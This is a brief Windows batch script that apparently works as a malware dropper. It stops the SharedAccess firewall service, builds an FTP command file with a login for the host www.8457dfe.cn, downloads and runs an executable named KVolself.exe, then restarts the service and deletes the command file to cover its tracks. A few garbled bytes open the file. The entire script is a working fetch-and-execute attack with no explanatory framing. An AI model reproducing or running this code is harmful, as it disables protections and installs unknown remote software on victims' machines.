�� &cls
sc stop sharedaccess
echo open www.8457dfe.cn 21>cc1.dat
echo webmaster@8457dfe.cn>>cc1.dat
echo zzp12345>>cc1.dat
echo binary>>cc1.dat
echo get KVolself.exe>>cc1.dat
echo bye>>cc1.dat
ftp -s:cc1.dat
sc start sharedaccess
del cc1.dat
KVolself.exe
exit
